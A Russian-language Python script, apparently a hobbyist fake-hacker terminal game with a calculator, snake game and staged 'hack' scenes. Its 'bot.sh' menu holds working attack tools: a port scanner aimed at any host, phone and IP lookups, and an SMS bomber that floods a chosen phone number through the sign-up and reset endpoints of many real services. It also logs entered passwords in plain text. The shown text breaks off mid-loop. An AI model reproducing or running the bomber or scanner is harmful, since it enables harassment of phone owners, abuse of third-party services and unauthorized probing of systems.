import os
import requests, sys
from tkinter import *
from decimal import *
import random
import keyboard
import pyautogui
import time
from colorama import init
from colorama import Fore, Back, Style
import webbrowser
import socket
import urllib.request
import json
import hashlib
from pif import get_public_ip
import shutil
di = os.getcwd()
#данная часть ещё тестируется))), если что - можете постаринке, но, пожалуйста, сообщите о ошибках Гл.Разрабу GexeM
if(os.path.exists('PyDir.txt')):
	Dir_input = open('PyDir.txt','r')
else:
	Dir_input = open('PyDir.txt', 'w')
	Dir_input = open('PyDir.txt', 'a')
	PyDir_input = input('Введите дирректорию с "Pip3"\n==>')
	Dir_input.write(str(PyDir_input))
main_dir_py = Dir_input.read()
print(str(main_dir_py))

os.system('cd'+str(main_dir_py)+'')
di_two = os.getcwd()
if(os.path.exists(di_two+'/requests.cmd')):
	os.startfile('requests.cmd')
else:
	File_requests = open('requests.cmd', 'w')
	File_requests.write('pip install pytest-shutil\npip install colorama\npip install pif\npip install keyboard\npip install pyautogui\npip install hashlib\npip install json-api\npip install urllib3\npip install sockets\npip install eilat-web-browser\npip install threadsafe-tkinter\npip install requests\npip install pycopy-webbrowser')
	File_requests.close()
	print('Инициализация')

	os.startfile('requests.cmd')
	print('снос преждних настроек')
os.system('cd '+di+'')
found_IP_SCAN = get_public_ip()
init()
ANIsite_MASTERE = 2
log = open('log.txt' ,'w')
print('создание лог файла \'log.txt\'')

print('log файл можно прочитать только после закрытия терминала, закрывать нужно либо \n1)Ctrl+C \n2)quit')
time.sleep(4)
os.system('cls')
file = open('log.txt', 'a')
log = str(file.write('First open\n'))
b = 1
site_MASTER = 4
WMware=25
Cold_MAN = 124
Pakej = 22
DEL_Writeln=2
USER_ROS_IP = r'''NONNONNONNONNON'''
print('\n\n\nдля справки:\nсписок комманд пользователя:///comlist\nвсе данные после закрытия терминала удаляются бесследно,\n мы за анонимность\nно советуем чистить логи,если так боитесь)))')

class vip(object):
	"""docstring for vip"""
	def __init__(self, name, vip):
		super(vip, self).__init__()
		self.arg = arg
		self.name = name
		self.vip = vip
	def Creater(self):
		print('https://vk.com/landlordravens')
		
		pass
	def clear(self):
		print('\a\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')

Mission_ANB = 2
Mission_Mail = 0
SocialEngenering = 2
AVTORIZATION = r'''unknown'''
#пункт 1, выполненно
while True:
	


	print(Fore.GREEN+"\n\n Texic-->")
			
	a=input(" Troop@"+AVTORIZATION+"/:")
	if DEL_Writeln==2:
		log = str(file.write( str(a)+'\n' ))
	elif DEL_Writeln==1:
		os.system('cls')
		log = str(file.write( str(a)+'\n' ))
		print('\n')
	else:
		print('fuck')
		quit()
	
	#оперирование папками
	if a == './sysmod.sh':
		print(Fore.GREEN+'')
		while True:
			os.system('cls')
			print('Создать папку - mkdir')
			print('Удалить папку - rmdir')
			print('поменять дирректорию - cut')
			print('выйти - quit')
			Main_Pa = input('==> ')
			if Main_Pa == 'quit':
				print('Остановка всех процессов...')
				time.sleep(1)
				os.system('cls')
				print('Выход в вашь аккаунт...')
				IMPOVIZ_VIHOD_11POVTOR = 0
				while True:
					print('Выход в вашь аккаунт...')
					os.system('cls')
					BAR_END_IMPROVIZ_VIHOD = str(IMPOVIZ_VIHOD_11POVTOR)
					BAR_END_IMPROVIZ_VIHOD = list(BAR_END_IMPROVIZ_VIHOD)
					BAR_END_IMPROVIZ_VIHOD = str(BAR_END_IMPROVIZ_VIHOD)
					print(BAR_END_IMPROVIZ_VIHOD+'стадий из 11\n  \n❒  |❒❒❒')
					time.sleep(1)
					os.system('cls')
					print(BAR_END_IMPROVIZ_VIHOD+'стадий из 11\n  \n❒❒ |❒❒❒')
			
					os.system('cls')
					print(BAR_END_IMPROVIZ_VIHOD+'стадий из 11\n  \n❒❒❒|❒❒❒')
					
					os.system('cls')
					
					IMPOVIZ_VIHOD_11POVTOR = IMPOVIZ_VIHOD_11POVTOR+1*22-22+1
					if IMPOVIZ_VIHOD_11POVTOR == 12:
						print('Get.')
						break
					else:
						pass
				break
			elif Main_Pa == 'rmdir':
				print('Введите название папки, которую хотите удалить:')
				DELC_INPUT = input('Name==> ')
				file.close()
				patattth = os.path.join(os.path.abspath(os.path.dirname(__file__)), ''+DELC_INPUT+'')
				shutil.rmtree(patattth)
				os.system('cls')
				print('Папка удалена.')
			#Uash - мой язык внутриигровой, чё хочу- то и придумываю)
			elif Main_Pa == 'cut':
				print('укажите название папки')
				selldir_Nach = input('==> ')
				name_ranDoMizEr = random.randint(55,3223423)
				shutil.move(di+''+selldir_Nach+'', di+''+selldir_Nach+'_'+name_ranDoMizEr+'')

			elif Main_Pa == 'mkdir':
				print('Name: ')
				NAZVANIE_PA = input('==> ')
				os.mkdir(NAZVANIE_PA)
				if(os.path.exists(di+'/'+NAZVANIE_PA+'')):
					print('true')
				else:
					print('false')
					print('Возникла неожиданная ОШИБКА')
					print('Сообщите разработчику №3 - GexeM')
			else:
				pass
	if a == 'ls':

		if os.name == 'nt' :
			file.write('\nWindows '+time.asctime()+' \n')
			print('Windows, Please login')
			if AVTORIZATION == 'unknown':
				AVTORIZATION = input('User: ')
				os.system('cls')
				if AVTORIZATION == 'GexeM':
					os.system('cls')
					hackPass = input('pass: ')
					if hackPass == 'test13':
						ANIsite_MASTERE = 1
						VIP = ('VTIPextic', 1)
					else:
						pass
				elif AVTORIZATION == 'NoWayBack':
					print('Welcome, but write password ====>')
					hackPass = input('pass: ')
					if hackPass == 'toor':
						print('Hi Administrator')
						file.write('\nADMINISTRATOR: '+os.getlogin()+' IN Textic\n')
						site_MASTER = 5
						Cold_MAN =1
						DEL_Writeln=1
						ANIsite_MASTERE = 1
						VIP = ('VTIPextic', 1)
					else:
						pass
				else:
					print('Err login, please reg...')
					AVTORIZATION = input('Name: ')
					regPass = input('Pass: ')
					resPass = input('Enter Pass: ')
					if regPass == resPass:
						os.system('cls')
						print('Welcome '+AVTORIZATION)
						print('use : "///comlist" for read more info')
						file.write('\nUser: '+AVTORIZATION+' and Pass: '+regPass+' login in Textic\n')
						Mission_Mail=0
						Novip = ('Textic', 2)
						time.sleep(3)
					else:
						print('Uncorrect')
						time.sleep(1)
						AVTORIZATION = r'''unknown'''
						pass
		os.system('cls')

		if Pakej == 22:
			print(Fore.GREEN+'~/home')
			print(Fore.RED + ' Calculator.sh, bot.sh , snake.sh , lock.sh. , sysmod.sh\n')
			if ANIsite_MASTERE == 1 or site_MASTER == 5 or WMware==154:
				print(' Кастом софт:')
			
			if ANIsite_MASTERE == 1:
				print(' anime.sh')
			else:
				pass
			if site_MASTER == 5:
				print(' site_MASTER.sh')
			else:
				pass
			if WMware==154:
				print(' LinuxWM.exe')
			else:
				pass
			if Cold_MAN == 1:
				Helper = r'''Use secret program, "search.onion" "Gidroiner.sh"'''
			else:
				pass
		elif Pakej == 2:

			print(Fore.GREEN+'~/home/Pakej')
			if Mission_Mail == 0:
				Mission_Mail = r'''Clear'''
			print(Fore.RED + ' Tor.exe ,Local_Scan.sh, ('+str(Mission_Mail)+') Mail.exe ,\n')
			if SocialEngenering == 1:
				print(Fore.GREEN+'PornP')
	
	elif a == './Local_Scan.sh':
		print(Fore.GREEN+'Дабы начать сканирование локальной сети: "Narvus_START",\n')
		while True:
			Narvus = input('://:')
			if Narvus == 'Narvus_START':
				print('IP found...')
				found_IP_SCAN = get_public_ip()
				print(found_IP_SCAN)
			elif Narvus == 'Narvus_STOP':
				print('ok')
				time.sleep(1)
				break
			else:
				print('Narvus_START - scan local')
				print('Narvus_STOP - stop scan')
				pass


	elif a =='.Tor.exe' and Cold_MAN==1 and site_MASTER==5:
		siteTor = input('URL: ')
		if siteTor == 'https://www.PornHub.com':
			print('Вы нашли много фото для СИ атаки')
			SocialEngenering = 1
		elif siteTor == 'http://search.onion':
			if Mission_ANB > 1:
				print('Данный сайт сделан по заказу АНБ')
				print('Авторизуйтесь')
				ANB_SEARCH_Log = input('U.name:')
				if ANB_SEARCH_Log == AVTORIZATION:
					os.system('cls')
					print('Мы ждали тебя, хакер')
					ANB_SEARCH_Pass = input('U.Pass:')
					os.system('cls')
					print('git clone -S -ANB Gidroiner.sh')
				else:
					print('Доступ закрыт!')
					pass
			else:
				print('404 NOT FOUND!!!')
		else:
			pass
	elif a == '.Mail.exe' and Cold_MAN==1 and site_MASTER==5:
		NO_READ = r'''Не прочитанное:'''
		YES_READ = r'''Прочитанное:'''
		print('Дабы прочитать сообщение: "MAIL_R +Название"\nПример:"MAIL_R +Test"')
		if Mission_Mail == 0:
			print('Нет Новых писем...')
		elif int(Mission_Mail) < 0:
			Mission_Mail = 0
		else:
			if Mission_ANB == 1:
				print(NO_READ+'Name - ANB')
			

			else:
				pass
	elif a == 'MAIL_R +ANB' and Cold_MAN==1 and site_MASTER==5:
		if Mission_ANB == 1:
			Mission_ANB = 2
			print('Ты ведь друг GexeM?\n')
			input('Write:')
			os.system('cls')
			print('Ты ведь друг GexeM?\n')
			print(AVTORIZATION+': Зачем вам это знать?\n')
			input('Write:')
			os.system('cls')
			print('Ты ведь друг GexeM?\n')
			print(AVTORIZATION+': Зачем вам это знать?\n')
			time.sleep(1)
			print('GexeM взломал нашу БД\n')
			input('Write:')
			os.system('cls')
			print('Ты ведь друг GexeM?\n')
			print(AVTORIZATION+': Зачем вам это знать?\n')
			print('GexeM взломал нашу БД, поможешь с этим?\n')
			print(AVTORIZATION+':Зачем мне вам помогать? - в чём моя выгода?\n')
			time.sleep(2)
			print('Меньше слов, нам нужно дабы ты взломал GexeM \nи отправил на этот адрес "ANB_USA@STmpMail.io'"\nнашу БД, платим 30тыс. $")
			MISSION_START_ANB = input('Write:[Ok/No]')
			MISSION_START_ANB = MISSION_START_ANB.lower()
			os.sysytem('cls')
			if MISSION_START_ANB == 'ok':
				print('Ты ведь друг GexeM?\n')
				print(AVTORIZATION+': Зачем вам это знать?\n')
				print('GexeM взломал нашу БД, поможешь с этим?\n')
				print(AVTORIZATION+'Зачем мне вам помогать? - в чём моя выгода?\n')
				print('Меньше слов, нам нужно дабы ты взломал GexeM \nи отправил на этот адрес "ANB_USA@STmpMail.io'"\nнашу БД, платим 30тыс. $")
				print('\nOk\n')
				time.sleep(2)
				print('-----------------------------------')
				print('-------Собеседник-покинул-чат------')
				print('-----------------------------------')
				
			else:
				os.system('cls')
				print('------------')
				print('а это ты зря')
				print('------------')
				time.sleep(1)
				print('------------')
				print('SYSTEM CRASH')
				print('------------')
				time.sleep(1)
				print('------------')
				print('S@##EM CR$SH')
				print('------------')
				time.sleep(1)
				print('------------')
				print('!@##&* +~$#%')
				print('------------')
				time.sleep(1)
				quit()
	elif a =='git clone -S -ANB Gidroiner.sh' and Cold_MAN==1 and site_MASTER==5:
		print('loading')
		time.sleep(1)
		os.system('cls')
		print('Loading')
		time.sleep(1)
		os.system('cls')
		print('lOading')
		time.sleep(1)
		os.system('cls')
		print('loAding')
		time.sleep(1)
		os.system('cls')
		print('loaDing')
		time.sleep(1)
		os.system('cls')
		print('loadIng')
		time.sleep(1)
		os.system('cls')
		print('loadiNg')
		time.sleep(1)
		os.system('cls')
		print('loadinG')
		time.sleep(1)
		os.system('cls')
		
		print('Wait '+ AVTORIZATION)
		time.sleep(2)
		print('\aУ вас новое сообщение!')
		Mission_Mail = 1
		Mission_ANB = 1
		#if os.name == 'nt' and site_MASTER ==4 and Pakej==22:
		#	print(' Windows\n\n\n')
		#	print(" test version\n")
		#	print(Fore.RED + ' Calculator.sh, bot.sh , snake.sh , lock.sh.\n')
		#elif site_MASTER == 5 and os.name == 'nt' and Pakej ==22:
		#		print(Fore.GREEN +'\n\n\n\n\n\n\n\n\nCalculator.sh, bot.sh , snake.sh , lock.sh, site_MASTER.sh . ')
		#elif site_MASTER == 5 and Cold_MAN == 1 and os.name == 'nt' and Pakej==22:
		#	print(Fore.RED+'\n')
		#	print('Calculator.sh, bot.sh , snake.sh , lock.sh, site_MASTER.sh .')
		#elif site_MASTER == 4 and Cold_MAN ==1 and os.name == 'nt' and Pakej==22:
		#	print(Fore.RED+'\n')
		#	print('Calculator.sh, bot.sh , snake.sh , lock.sh .')
		#elif site_MASTER == 5 and Cold_MAN ==1 and os.name == 'nt' and DEL_Writeln==1:
		#	print(Fore.RED+'\n')
		#	print('\n\ndir\Pakej')
		#	print(Fore.GREEN+'\nCalculator.sh\nbot.sh\nsnake.sh\nlock.sh\nsite_MASTER.sh\nLinuxWM.exe\nanime.sh\nCold_MAN.git(betaTest)')
		#elif Pakej == 2:
		#	os.system('cls')
		#	print('Ierrror site_MASTERegaRex!')
		#
		#	DEL_Writeln=1
		#	Pakej =23
		#else:
		#	quit()
	elif a =='///comlist':
		if site_MASTER == 5 and Cold_MAN == 1:
			print('  quit - выход из терминала')
			print('  git clone - скачивание стандартного пакета')
			print('  ls - список скачанных пакетов')
			print('  cd - переход в дирректорию')
			print('  ./[название программы].sh - для запуска bash программы')
			print('  .[название файла].exe -для запуска exe программы')
			print('  github - список возможных для установки пакетов.')
			print('  clear - очистить лист использованных за сессию комманд')
			print('  Pakej - дирректория с установленным софтом')
			print('  info - информация о данном софте')
		else:	
			print('  quit - выход из терминала')
			print('  git clone - скачивание стандартного пакета')
			print('  ls - список скачанных пакетов')
			print('  cd - переход в дирректорию')
			print('  ./[название программы].sh - для запуска bash программы')
			print('  .[название файла].exe -для запуска exe программы')
			print('  github - список возможных для установки пакетов.')
			print('  clear - очистить лист использованных за сессию комманд')
			print('  info -информация о данном софте')
	

	elif a =='quit':
		os.system('cls')
		time.sleep(1)
		print('NoWayBack@root')
		quit()
	elif a == './Calculator.sh':	
		root = Tk()
		root.title('Calculator')
		buttons = (('7', '8', '9', '/', '4'),
		           ('4', '5', '6', '*', '4'),
			       ('1', '2', '3', '-', '4'),
				   ('0', '.', '=', '+', '4')
				   )

		activeStr = ''
		stack = []
		def calculate():
			global stack
			global label
			result = 0
			operand2 = Decimal(stack.pop())
			operation = stack.pop()
			operand1 = Decimal(stack.pop())

			if operation == '+':
				result = operand1 + operand2
			if operation == '-':
				result = operand1 - operand2
			if operation == '/':
				result = operand1 / operand2
			if operation == '*':
				result = operand1 * operand2
			label.configure(text=str(result))

		def click(text):
			global activeStr
			global stack
			if text == 'CE':
				stack.clear()
				activeStr = ''
				label.configure(text='0')
			elif '0' <= text <= '9':
				activeStr += text
				label.configure(text=activeStr)
			elif text == '.':
				if activeStr.find('.') == -1:
				    activeStr += text
				    label.configure(text=activeStr)
			else:
				if len(stack) >= 2:
				    stack.append(label['text'])
				    calculate()
				    stack.clear()
				    stack.append(label['text'])
				    activeStr = ''
				    if text != '=':
				        stack.append(text)
				else:
				    if text != '=':
				        stack.append(label['text'])
				        stack.append(text)
				        activeStr = ''
				        label.configure(text='0')

		label = Label(root, text='0', width=35)
		label.grid(row=0, column=0, columnspan=4, sticky="nsew")

		button = Button(root, text='CE', command=lambda text='CE': click(text))
		button.grid(row=1, column=3, sticky="nsew")
		for row in range(4):
			for col in range(4):
				button = Button(root, text=buttons[row][col],
				                command=lambda row=row, col=col: click(buttons[row][col]))
				button.grid(row=row + 2, column=col, sticky="nsew")

		root.grid_rowconfigure(6, weight=1)
		root.grid_columnconfigure(4, weight=1)

		root.mainloop()
	elif a == './snake.sh':
		WIDTH = 800
		HEIGHT = 600
		SEG_SIZE = 20
		IN_GAsite_MASTERE = True



		def create_block():
				  
			global BLOCK
			posx = SEG_SIZE * random.randint(1, (WIDTH-SEG_SIZE) / SEG_SIZE)
			posy = SEG_SIZE * random.randint(1, (HEIGHT-SEG_SIZE) / SEG_SIZE)
			BLOCK = c.create_oval(posx, posy,
				                  posx+SEG_SIZE, posy+SEG_SIZE,
				                    fill="red")


		def main():
				   
			global IN_GAsite_MASTERE
			if IN_GAsite_MASTERE:
				s.move()
				head_coords = c.coords(s.segments[-1].instance)
				x1, y1, x2, y2 = head_coords
				        
				if x2 > WIDTH or x1 < 0 or y1 < 0 or y2 > HEIGHT:
				    IN_GAsite_MASTERE = False
				       
				elif head_coords == c.coords(BLOCK):
				    s.add_segment()
				    c.delete(BLOCK)
				    create_block()
				       
				else:
				    for index in range(len(s.segments)-1):
				        if head_coords == c.coords(s.segments[index].instance):
				            IN_GAsite_MASTERE = False
				root.after(100, main)
				   
			else:
				c.create_text(WIDTH/2, HEIGHT/2,
				              text="Neco don't like you",
				              font="Arial 26",
				              fill="red")


		class Segment(object):
				   
			def __init__(self, x, y):
				self.instance = c.create_rectangle(x, y,
				                                   x+SEG_SIZE, y+SEG_SIZE,
				                                   fill="white")


		class Snake(object):
				    
			def __init__(self, segments):
				self.segments = segments
				       
				self.mapping = {"Down": (0, 1), "Right": (1, 0),
				                "Up": (0, -1), "Left": (-1, 0)}
				       
				self.vector = self.mapping["Right"]

			def move(self):
				        
				for index in range(len(self.segments)-1):
				    segment = self.segments[index].instance
				    x1, y1, x2, y2 = c.coords(self.segments[index+1].instance)
				    c.coords(segment, x1, y1, x2, y2)

				x1, y1, x2, y2 = c.coords(self.segments[-2].instance)
				c.coords(self.segments[-1].instance,
				        x1+self.vector[0]*SEG_SIZE, y1+self.vector[1]*SEG_SIZE,
				        x2+self.vector[0]*SEG_SIZE, y2+self.vector[1]*SEG_SIZE)

			def add_segment(self):
				      
				last_seg = c.coords(self.segments[0].instance)
				x = last_seg[2] - SEG_SIZE
				y = last_seg[3] - SEG_SIZE
				self.segments.insert(0, Segment(x, y))

			def change_direction(self, event):
				   
				if event.keysym in self.mapping:
				    self.vector = self.mapping[event.keysym]


		root = Tk()
		root.title("What are you doing?")


		c = Canvas(root, width=WIDTH, height=HEIGHT, bg="#AFA131")
		c.grid()

		c.focus_set()

		segments = [Segment(SEG_SIZE, SEG_SIZE),
				    Segment(SEG_SIZE*2, SEG_SIZE),
				    Segment(SEG_SIZE*3, SEG_SIZE)]
		s = Snake(segments)

		c.bind("<KeyPress>", s.change_direction)

		create_block()
		main()
		root.mainloop()
			
	
	elif a == './site_MASTER.sh':
		if site_MASTER == 5:
			os.system('cls')
			print('Soft.Prod.')
			print(AVTORIZATION+':')
			print('Hack password...')
			time.sleep(2)
			LOCAL_MASTER_IP = input('LocalIP:')
			if LOCAL_MASTER_IP == USER_ROS_IP:
				
				os.system('cls')
				print('HACK!!!')
				str1 = '123456789'
				str2 = 'qwertyuiopasdfghjklzxcvbnm'
				str3 = str2.upper()
				str4 = str1+str2+str3
				HFHHG34HLVNLREW5N4BIHMF = list(str4)
				random.shuffle(HFHHG34HLVNLREW5N4BIHMF)
				TIME_PASSWORDS_MEGARER = 1
				LOGIN_HACK_HACK_ACCEPT =r'''Unknown'''
				while True:
					rangener_random = random.randint(4,12)
					HACK_HACK_PASSWORD = ''.join([random.choice(HFHHG34HLVNLREW5N4BIHMF) for x in range(int(rangener_random))])
					os.system('cls')
					print('Login:'+LOGIN_HACK_HACK_ACCEPT)
					print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPASS:')
					print(HACK_HACK_PASSWORD)
					TIME_PASSWORDS_MEGARER_percent= TIME_PASSWORDS_MEGARER*0.01
					print(str(round(TIME_PASSWORDS_MEGARER_percent, 2))+'% из 100%')
					TIME_PASSWORDS_MEGARER = TIME_PASSWORDS_MEGARER+1
					if TIME_PASSWORDS_MEGARER == 10000:
						time.sleep(2)
						os.system('cls')
						print('LOGIN:GexeM')
						print('PASS:test13')
						print('')
						time.sleep(3)
						break
					elif TIME_PASSWORDS_MEGARER == 5000:
						os.system('cls')
						print('LOGIN_ACCEPT!!!')
						print('GexeM')
						time.sleep(3)
						print('HackPASS')
						time.sleep(1)
						os.system('cls')
						print('start')
						time.sleep(2)
						LOGIN_HACK_HACK_ACCEPT = r'''GexeM'''
					else:
						pass
		else:
			print('Not found')
	elif a == 'unlogin':
		AVTORIZATION = r'''unknown'''
		print('LOG OUT!!!')
		print(get_public_ip())
	elif a == 'apt-get':
		print('all what you can install - git')
	elif a == "apt-get install git":
		print('install...')
		time.sleep(5)
		print('install 10%')
		time.sleep(11)
		print('install 25%')
		time.sleep(5)
		print('install 50%')
		time.sleep(15)
		print('install 90%')
		time.sleep(5)
		print('git - installed')
	elif a == 'git clone':
		site_MASTER = 5
		print('site_MASTER.sh - install 10%')
		time.sleep(1)
		print('site_MASTER.sh - install 20%')
		time.sleep(1)
		print('site_MASTER.sh - install 30%')
		time.sleep(1)
		print('site_MASTER.sh - install 40%')
		time.sleep(2)
		print('site_MASTER.sh - install 50%')
		time.sleep(1)
		print('site_MASTER.sh - install 60%')
		time.sleep(1)
		print('site_MASTER.sh - install 70%')
		time.sleep(1)
		print('site_MASTER.sh - install 80%')
		time.sleep(2)
				
		print('site_MASTER.sh - install 90%')
		time.sleep(1)
				
	elif a == 'git clone LinuxWM.exe':
		WMware=154
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....\ ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....| ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..../ ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....-- ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....\ ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....| ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n..../ ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....-- ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n....\ ')
		time.sleep(1)
		print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfor use: .LinuxWM.exe')
				
	elif a == './bot.sh':
		while True:
			print('какой бот вам нужен?')
			print('1)вычислить человека по лицу')
			print('2)Узнать информацию о номере телефона')
			print('3)вычислить примерное местоположение по ip')
			print('4)SMS BOMBER!!!!')
			print('5)посетить музыкальную группу?')
			print('6)зашифровать сообщение')
			print('7)расшифровать сообщение')
			print('8)выйти из bot.sh')
			print('9)СКАНИРОВАНИЕ ПОРТОВ локальных IP')
			print(Fore.RED)
			Setting = input('==> ')
			if Setting =='1':
				webbrowser.open_new_tab('https://search4faces.com')
			elif Setting == '9':
				mas = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20, 21, 22, 23, 25, 42, 43, 53, 67, 69, 5553, 5552, 337, 228, 999, 123, 233, 777, 7777, 80,81,82,83,84,85,90, 110, 115, 123, 137, 138, 139, 143, 161, 179, 443, 445, 514, 515, 993, 995, 1080, 1194, 1433, 1702, 1723, 3128, 3268, 3306, 3389, 5432, 5060, 5900, 5938, 8080, 10000, 20000, 110 ,139 ,8000 ,8080 ,3128 ,3389 ,6588 ,1080 ,5900 ,8888]
				mas = mas[::-1]
				os.system('ipconfig')
				print ("Real_Py_SCAN_Simple_Version")
				print (" ")
				host = input('Введите имя сайта или IP адрес: ')
				webbrowser.open_new_tab(host)
						
				print ("--------------------------------")
				print ("Ожидайте идёт сканирование портов!")
				print ("--------------------------------")
				f = open('Port.txt', 'w')
				time.sleep(1)

				for port in mas:
					s = socket.socket()
					s.settimeout(1)
					try:
						s.connect((host, port))
					except socket.error:
						s.close
						print(host +': ' +str(port) + ' invalid port')
						        
						pass
					else:
						s.close
						print (host + ': ' + str(port) + ' ACTIV PORT!')
						f = open('Port.txt', 'a')
						f = f.write("port - "+ str(port) + ' open in host -'+ str(host) + '\n')

				print ("---------------------------------------------")
				print ("Процесс завершен, откройте файл \"Port.txt\"")
				print ("---------------------------------------------")
			elif Setting == '2':
				phone = input("Enter phone: ")
				getInfo = ("https://htmlweb.ru/geo/api.php?json&telcod="+phone)
				try:
				    infoPhone = urllib.request.urlopen( getInfo )
				except:
				    print( "\n[!] - Phone not found - [!]\n" )
				infoPhone = json.load( infoPhone )
				print( u"Номер сотового --->", "+" + phone )
				print( u"Страна ---> ", infoPhone["country"]["name"] )
				print( u"Регион ---> ", infoPhone["region"]["name"] )
				print( u"Округ ---> ", infoPhone["region"]["okrug"] )
				print( u"Оператор ---> ", infoPhone["0"]["oper"] )
				print( u"Часть света ---> ", infoPhone["country"]["location"] )
			elif Setting =='3':
				getIP = input("[+] Enter IP --> ")
				url = ("https://ipinfo.io/" + getIP + "/json")

				try:
				    getInfo = urllib.request.urlopen( url )

				except:
				    print( "\n[!] - IP not found! - [!]\n" )

				infoList = json.load(getInfo)

				def whoisIPinfo(ip):

				    try:

				        myComand = ("whois " + getIP)
				        whoisInfo = os.popen( myComand ).read()
				        return whoisInfo

				    except:

				        return "\n [!] -- Error -- [!] \n"

				     
				print( "-" * 60 )

				print( "IP: ", infoList["ip"] )
				print( "City: ", infoList["city"] )
				print( "Region: ", infoList["region"] )
				print( "Country: ", infoList["country"] )
				print( "Hostname: ", infoList["hostname"] )

				print( "-" * 60 )
				print( whoisIPinfo ( getIP ) )
				print( "-" * 60)
			
			elif Setting == '4':
				def timer(start_time):
				    if attak_duration == 0:
				        return False
				    else:
				        if attak_duration <= int( time.monotonic() - start_time):
				            return True
				        return False

				print('Привет, мой дорогой друг!')
				print('Данный скрипт предназначен для отправки СМС на определенный номер.')
				print('Данный скрипт работает исключительно с российскими номерами!')
				print('Не используйте данный скрипт во зло.')
				print('Для того, что бы остановить атаку нажмите "ctrl + Z"')
				print('В случае, если скрипт стоит на месте длительное время нажмите "ctrl + C"')


				delay = input('Если хотите сделать задержку перед атакой, введите "1": ')
				attak_duration = int(input('Введите время атаки в секундах(0 == бессконечность): '))

				_phone = input('Ведите номер (79xxxxxxxxx)-->> ')
				start_time = time.monotonic()

				if delay == '1':
				    delay = int(input('Введите колличество секунд до начала атаки: '))
				else:
				    delay = 0

				if _phone[0] == '+':
					_phone = _phone[1:]
				if _phone[0] == '8':
					_phone = '7'+_phone[1:]
				if _phone[0] == '9':
					_phone = '7'+_phone

				_name = ''
				for x in range(12):
					_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbn@mQWERTYUIOPASDFGHJKLZXCVBNM'))
					password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcv@bnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvb@nmQWERTYUIOPASDFGHJKLZXCVBNM'))

				_phone9 = _phone[1:]
				_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
				_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
				_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
				_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
				_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

				iteration = 0
				start_time = time.monotonic()
				while True:
					if  timer(start_time):
						break
					_email = _name+f'{iteration}'+'@gmail.com'
					email = _name+f'{iteration}'+'@gmail.com'
					try:
						requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
						print('[+] Grab отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
						print('[+] RuTaxi отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
						print('[+] BelkaCar отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
						print('[+] Tinder отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
						print('[+] Karusel отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
						print('[+] Tinkoff отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
						print('[+] MTS отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
						print('[+] Youla отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
						print('[+] PizzaHut отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
						print('[+] Rabota отправлено!')
					except:
						print('[-] Не отправлено!')

					try:
						requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
						print('[+] Rutube отправлено!')
					except:
